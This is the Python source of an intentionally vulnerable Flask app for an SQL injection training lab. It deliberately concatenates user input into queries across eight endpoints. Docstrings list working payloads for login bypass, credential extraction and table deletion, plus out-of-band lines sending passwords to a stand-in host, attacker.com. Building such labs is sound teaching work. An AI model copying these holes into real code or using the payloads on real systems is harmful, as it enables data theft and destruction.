#!/usr/bin/env python3
"""
================================================================================
SQL INJECTION LAB - INTENTIONALLY VULNERABLE FLASK APPLICATION
================================================================================
⚠️  WARNING: This application is intentionally vulnerable and should ONLY be
    used in a local lab environment for educational cybersecurity training.

    DO NOT deploy this application on any public-facing server or production
    environment. It contains deliberate security flaws for learning purposes.
================================================================================
"""

import sqlite3
import os
import time
import random
import string
from datetime import datetime
from flask import Flask, request, render_template, g, redirect, url_for, flash, jsonify, session

app = Flask(__name__)
app.secret_key = 'sqli-lab-secret-key-2024'  # Weak secret for demo purposes

DATABASE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'sqli_lab.db')

# ==============================================================================
# DATABASE HELPERS
# ==============================================================================

def get_db():
    """Get database connection."""
    if 'db' not in g:
        g.db = sqlite3.connect(DATABASE)
        g.db.row_factory = sqlite3.Row
    return g.db

@app.teardown_appcontext
def close_db(error):
    """Close database connection."""
    if hasattr(g, 'db'):
        g.db.close()

def init_db():
    """Initialize database from SQL script."""
    if not os.path.exists(DATABASE):
        with app.app_context():
            db = get_db()
            with open('database.sql', 'r') as f:
                db.executescript(f.read())
            db.commit()
            print("[+] Database initialized successfully!")
    else:
        print("[*] Database already exists. Skipping initialization.")

# ==============================================================================
# HOME PAGE
# ==============================================================================

@app.route('/')
def index():
    """Home page with navigation to all vulnerable endpoints."""
    return render_template('index.html')

# ==============================================================================
# VULNERABILITY 1: CLASSIC SQL INJECTION (Authentication Bypass)
# ==============================================================================
# VULNERABLE CODE: String concatenation in SQL query without parameterization
# ATTACK VECTOR: Authentication bypass via SQL injection in login form
# PAYLOAD EXAMPLE: username = admin' --  OR  admin' OR '1'='1
# ==============================================================================

@app.route('/login', methods=['GET', 'POST'])
def login():
    """
    VULNERABILITY: Classic SQL Injection (Authentication Bypass)

    The login query is built using string concatenation with user input.
    An attacker can bypass authentication by injecting SQL code.

    VULNERABLE QUERY:
        SELECT * FROM users WHERE username = 'INPUT' AND password = 'INPUT'

    ATTACK PAYLOADS:
        Username: admin' --
        Password: anything

        Username: admin' OR '1'='1
        Password: anything

        Username: ' OR '1'='1' --
        Password: anything
    """
    error = None
    result = None
    executed_query = None

    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        db = get_db()

        # VULNERABLE: Direct string concatenation - NO PARAMETERIZATION
        query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
        executed_query = query

        try:
            # This executes the maliciously crafted query
            result = db.execute(query).fetchone()

            if result:
                session['user_id'] = result['id']
                session['username'] = result['username']
                session['role'] = result['role']
                flash(f"Welcome, {result['username']}! (Role: {result['role']})", 'success')
            else:
                error = "Invalid username or password"
        except sqlite3.Error as e:
            error = f"Database error: {str(e)}"

    return render_template('login.html', error=error, result=result, query=executed_query)

# ==============================================================================
# VULNERABILITY 2: UNION-BASED SQL INJECTION
# ==============================================================================
# VULNERABLE CODE: User input directly concatenated into SELECT query
# ATTACK VECTOR: UNION SELECT to extract data from other tables
# PAYLOAD EXAMPLE: ' UNION SELECT id, username, password, email, role FROM users --
# ==============================================================================

@app.route('/search')
def search():
    """
    VULNERABILITY: Union-Based SQL Injection

    The search functionality concatenates user input directly into a SELECT query.
    Attackers can use UNION to combine results from other tables.

    VULNERABLE QUERY:
        SELECT id, name, description, price, category FROM products WHERE name LIKE '%INPUT%'

    ATTACK PAYLOADS:
        ' UNION SELECT id, username, password, email, role FROM users --
        ' UNION SELECT id, secret_key, secret_value, description, 'secrets' FROM secrets --
        ' UNION SELECT null, sql, null, null, null FROM sqlite_master --
    """
    query_param = request.args.get('q', '')
    results = []
    executed_query = None
    error = None

    db = get_db()

    # VULNERABLE: Direct string concatenation in SELECT query
    query = "SELECT id, name, description, price, category FROM products WHERE name LIKE '%" + query_param + "%'"
    executed_query = query

    try:
        results = db.execute(query).fetchall()
    except sqlite3.Error as e:
        error = str(e)

    return render_template('search.html', 
                         results=results, 
                         query=query_param, 
                         executed_query=executed_query,
                         error=error)

# ==============================================================================
# VULNERABILITY 3: ERROR-BASED SQL INJECTION
# ==============================================================================
# VULNERABLE CODE: User input in query where errors reveal database structure
# ATTACK VECTOR: Trigger SQL errors to extract information via error messages
# PAYLOAD EXAMPLE: ' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END) --
# ==============================================================================

@app.route('/profile/<user_id>')
def profile(user_id):
    """
    VULNERABILITY: Error-Based SQL Injection

    The user_id parameter is directly used in a query. SQLite error messages
    can reveal database structure information when queries fail.

    VULNERABLE QUERY:
        SELECT * FROM users WHERE id = INPUT

    ATTACK PAYLOADS:
        1 AND 1=2 UNION SELECT null, null, null, null, null -- (column count discovery)
        1' (syntax error reveals query structure)
        1 AND (SELECT CASE WHEN (substr(sql,1,1)='C') THEN 1/0 ELSE 1 END FROM sqlite_master WHERE type='table') --
    """
    db = get_db()
    result = None
    executed_query = None
    error = None

    # VULNERABLE: No input validation or parameterization
    query = "SELECT * FROM users WHERE id = " + user_id
    executed_query = query

    try:
        result = db.execute(query).fetchone()
    except sqlite3.Error as e:
        error = str(e)

    return render_template('profile.html', 
                         result=result, 
                         user_id=user_id,
                         executed_query=executed_query,
                         error=error)

# ==============================================================================
# VULNERABILITY 4: BOOLEAN-BASED BLIND SQL INJECTION
# ==============================================================================
# VULNERABLE CODE: Query result affects page content (True/False visible difference)
# ATTACK VECTOR: Ask True/False questions via SQL and observe page differences
# PAYLOAD EXAMPLE: 1 AND (SELECT CASE WHEN (substr(password,1,1)='a') THEN 1 ELSE 1/0 END FROM users WHERE username='admin')=1
# ==============================================================================

@app.route('/check-order')
def check_order():
    """
    VULNERABILITY: Boolean-Based Blind SQL Injection

    The endpoint returns different content based on whether the query returns
    results or not. Attackers can ask True/False questions character by character.

    VULNERABLE QUERY:
        SELECT * FROM orders WHERE id = INPUT

    ATTACK PAYLOADS:
        1 AND (SELECT CASE WHEN (substr((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN 1 ELSE 1/0 END)=1
        1 AND (SELECT length(password) FROM users WHERE username='admin') > 5
        1 AND (SELECT CASE WHEN (username='admin') THEN 1 ELSE 1/0 END FROM users WHERE id=1)=1
    """
    order_id = request.args.get('id', '')
    db = get_db()
    result = None
    executed_query = None
    error = None

    # VULNERABLE: No parameterization
    query = "SELECT * FROM orders WHERE id = " + order_id
    executed_query = query

    try:
        result = db.execute(query).fetchone()
    except sqlite3.Error as e:
        error = str(e)

    return render_template('check_order.html',
                         result=result,
                         order_id=order_id,
                         executed_query=executed_query,
                         error=error)

# ==============================================================================
# VULNERABILITY 5: TIME-BASED BLIND SQL INJECTION
# ==============================================================================
# VULNERABLE CODE: Query execution time can be controlled via SQL functions
# ATTACK VECTOR: Use time-delay functions to infer True/False conditions
# PAYLOAD EXAMPLE: 1 AND (SELECT CASE WHEN (1=1) THEN randomblob(1000000000) ELSE 1 END)
# ==============================================================================

@app.route('/report')
def report():
    """
    VULNERABILITY: Time-Based Blind SQL Injection

    The report generation endpoint is vulnerable to time-based attacks.
    In SQLite, heavy operations like randomblob() can cause noticeable delays.
    Attackers measure response times to infer True/False conditions.

    VULNERABLE QUERY:
        SELECT * FROM products WHERE id = INPUT

    ATTACK PAYLOADS:
        1 AND (SELECT CASE WHEN (substr((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN randomblob(1000000000) ELSE 1 END)
        1 AND (SELECT CASE WHEN (SELECT count(*) FROM users WHERE role='admin') > 0 THEN randomblob(1000000000) ELSE 1 END)

    NOTE: randomblob(N) allocates N bytes of memory. Large values cause delays.
    """
    product_id = request.args.get('id', '1')
    db = get_db()
    result = None
    executed_query = None
    error = None
    start_time = time.time()

    # VULNERABLE: Direct concatenation allows time-delay injection
    query = "SELECT * FROM products WHERE id = " + product_id
    executed_query = query

    try:
        result = db.execute(query).fetchone()
    except sqlite3.Error as e:
        error = str(e)

    elapsed_time = time.time() - start_time

    return render_template('report.html',
                         result=result,
                         product_id=product_id,
                         executed_query=executed_query,
                         error=error,
                         elapsed_time=round(elapsed_time, 4))

# ==============================================================================
# VULNERABILITY 6: OUT-OF-BAND SQL INJECTION (Simulated)
# ==============================================================================
# VULNERABLE CODE: Query results can trigger external interactions
# ATTACK VECTOR: Use SQLite features to simulate out-of-band data exfiltration
# PAYLOAD EXAMPLE: 1 AND load_extension('evil.dll') [Note: load_extension disabled by default]
#                  Alternative: Use error messages or timing for exfiltration
# ==============================================================================

@app.route('/api/stats')
def api_stats():
    """
    VULNERABILITY: Out-of-Band SQL Injection (Simulated)

    In real scenarios, OOB SQLi uses database functions to make network requests
    (e.g., xp_dirtree in MSSQL, LOAD_FILE() in MySQL, UTL_HTTP in Oracle).

    Since SQLite doesn't have native network functions, we simulate the concept
    by showing how attacker-controlled data could be exfiltrated via query results
    that are then processed by the application.

    VULNERABLE QUERY:
        SELECT * FROM logs WHERE id = INPUT

    SIMULATED PAYLOADS:
        1 UNION SELECT id, 'DNS_EXFIL_' || password, 'oob-demo', log_time FROM users
        1 UNION SELECT id, 'EXFIL_' || secret_value, secret_key, 'exfiltrated' FROM secrets

    In a real OOB scenario with other DBMS:
        MySQL: 1 AND LOAD_FILE(CONCAT('\\attacker.com\', (SELECT password FROM users LIMIT 1)))
        MSSQL: 1; EXEC master..xp_dirtree '\\attacker.com\test' --
    """
    log_id = request.args.get('id', '1')
    db = get_db()
    results = []
    executed_query = None
    error = None

    # VULNERABLE: Direct concatenation
    query = "SELECT * FROM logs WHERE id = " + log_id
    executed_query = query

    try:
        results = db.execute(query).fetchall()
    except sqlite3.Error as e:
        error = str(e)

    return render_template('api_stats.html',
                         results=results,
                         log_id=log_id,
                         executed_query=executed_query,
                         error=error)

# ==============================================================================
# VULNERABILITY 7: SECOND-ORDER SQL INJECTION
# ==============================================================================
# VULNERABLE CODE: User input stored in DB, later used in another query unsafely
# ATTACK VECTOR: Inject payload in one function, trigger in another function later
# PAYLOAD EXAMPLE: Name: admin', (SELECT password FROM users WHERE username='admin'), ' --
# ==============================================================================

@app.route('/feedback', methods=['GET', 'POST'])
def feedback():
    """
    VULNERABILITY: Second-Order SQL Injection (Storage Phase)

    This endpoint stores user input in the database. The input appears safe here
    because it's just an INSERT, but the real vulnerability is in /admin/feedback
    where this stored data is later used in a vulnerable query.

    ATTACK PAYLOADS (to store):
        Name: admin' UNION SELECT password FROM users WHERE username='admin' --
        Message: normal message text

        Name: normal
        Message: ' || (SELECT group_concat(username || ':' || password) FROM users) || '
    """
    success = None
    error = None

    if request.method == 'POST':
        name = request.form.get('name', '')
        email = request.form.get('email', '')
        message = request.form.get('message', '')

        db = get_db()

        # This INSERT is actually vulnerable too, but the main vulnerability
        # is in the admin panel where this data is retrieved
        query = "INSERT INTO feedback (name, email, message) VALUES ('" + name + "', '" + email + "', '" + message + "')"

        try:
            db.execute(query)
            db.commit()
            success = "Thank you for your feedback! It will be reviewed by our admin team."
        except sqlite3.Error as e:
            error = str(e)

    return render_template('feedback.html', success=success, error=error)

@app.route('/admin/feedback')
def admin_feedback():
    """
    VULNERABILITY: Second-Order SQL Injection (Execution Phase)

    This is where the stored malicious payload from /feedback is executed.
    The admin panel retrieves feedback using the stored 'name' field in a 
    vulnerable query, triggering the stored injection payload.

    VULNERABLE QUERY:
        SELECT * FROM feedback WHERE name = 'STORED_PAYLOAD'

    TRIGGER PAYLOAD (stored via /feedback):
        Name: ' OR '1'='1' --
        This makes the query: SELECT * FROM feedback WHERE name = '' OR '1'='1' --'
        Which returns ALL feedback entries, including unapproved ones.

    ADVANCED PAYLOAD:
        Name: ' UNION SELECT id, username, password, email, role FROM users --
        This injects user credentials into the feedback result set!
    """
    db = get_db()
    results = []
    executed_query = None
    error = None

    # Admin can filter by name - this is where the stored payload executes!
    name_filter = request.args.get('name', '')

    # VULNERABLE: Using stored user input in a new query without sanitization
    if name_filter:
        query = "SELECT * FROM feedback WHERE name = '" + name_filter + "'"
    else:
        query = "SELECT * FROM feedback WHERE is_approved = 1"

    executed_query = query

    try:
        results = db.execute(query).fetchall()
    except sqlite3.Error as e:
        error = str(e)

    return render_template('admin_feedback.html',
                         results=results,
                         name_filter=name_filter,
                         executed_query=executed_query,
                         error=error)

# ==============================================================================
# VULNERABILITY 8: STACKED QUERIES SQL INJECTION
# ==============================================================================
# VULNERABLE CODE: Multiple SQL statements can be executed via semicolon separation
# ATTACK VECTOR: Append additional SQL statements after the original query
# PAYLOAD EXAMPLE: 1; DROP TABLE users; --  OR  1; INSERT INTO users (...) VALUES (...); --
# ==============================================================================

@app.route('/admin')
def admin():
    """
    VULNERABILITY: Stacked Queries SQL Injection

    This endpoint uses executescript() which allows multiple SQL statements
    separated by semicolons. An attacker can append malicious queries.

    VULNERABLE CODE:
        db.executescript("SELECT * FROM logs WHERE id = " + user_input)

    ATTACK PAYLOADS:
        1; DROP TABLE feedback; --
        1; INSERT INTO users (username, password, email, role) VALUES ('hacker', 'hacked', 'hacker@evil.com', 'admin'); --
        1; UPDATE users SET role='admin' WHERE username='alice'; --
        1; DELETE FROM orders; --

    WARNING: This can cause DATA LOSS. Use with caution in your lab!
    """
    db = get_db()
    results = []
    executed_query = None
    error = None

    log_filter = request.args.get('filter', '1=1')

    # VULNERABLE: executescript() allows multiple statements!
    # This is the key difference - we intentionally use executescript
    query = "SELECT * FROM logs WHERE " + log_filter
    executed_query = query

    try:
        # executescript() allows stacked queries - INTENTIONALLY VULNERABLE
        cursor = db.executescript(query)
        # Need to execute again to get results since executescript doesn't return rows directly
        results = db.execute("SELECT * FROM logs WHERE " + log_filter).fetchall()
    except sqlite3.Error as e:
        error = str(e)

    return render_template('admin.html',
                         results=results,
                         log_filter=log_filter,
                         executed_query=executed_query,
                         error=error)

# ==============================================================================
# SECURE VERSIONS (For Comparison/Education)
# ==============================================================================

@app.route('/secure/login', methods=['GET', 'POST'])
def secure_login():
    """
    SECURE VERSION: Uses parameterized queries to prevent SQL injection.

    This demonstrates how the same functionality can be implemented securely.
    The ? placeholder ensures user input is treated as data, not SQL code.
    """
    error = None
    result = None

    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        db = get_db()

        # SECURE: Parameterized query - input is treated as data only
        query = "SELECT * FROM users WHERE username = ? AND password = ?"
        result = db.execute(query, (username, password)).fetchone()

        if result:
            flash(f"Secure login successful for {result['username']}", 'success')
        else:
            error = "Invalid credentials"

    return render_template('secure_login.html', error=error, result=result)

@app.route('/secure/search')
def secure_search():
    """SECURE VERSION: Parameterized search query."""
    query_param = request.args.get('q', '')
    db = get_db()

    # SECURE: Parameterized LIKE query
    results = db.execute(
        "SELECT * FROM products WHERE name LIKE ?",
        ('%' + query_param + '%',)
    ).fetchall()

    return render_template('secure_search.html', results=results, query=query_param)

# ==============================================================================
# UTILITY ENDPOINTS
# ==============================================================================

@app.route('/logout')
def logout():
    """Clear session."""
    session.clear()
    flash("Logged out successfully", 'info')
    return redirect(url_for('index'))

@app.route('/reset-db')
def reset_db():
    """Reset database to initial state."""
    if os.path.exists(DATABASE):
        os.remove(DATABASE)
    init_db()
    flash("Database reset to initial state", 'success')
    return redirect(url_for('index'))

@app.route('/docs')
def docs():
    """Documentation and payloads page."""
    return render_template('docs.html')

# ==============================================================================
# MAIN
# ==============================================================================

if __name__ == '__main__':
    init_db()
    print("=" * 70)
    print("SQL INJECTION LAB - Starting Server")
    print("=" * 70)
    print("⚠️  WARNING: This application is INTENTIONALLY VULNERABLE")
    print("    Only use in a local, isolated environment for education.")
    print("=" * 70)
    print("Access the lab at: http://127.0.0.1:5000")
    print("=" * 70)
    app.run(debug=True, host='127.0.0.1', port=5000)
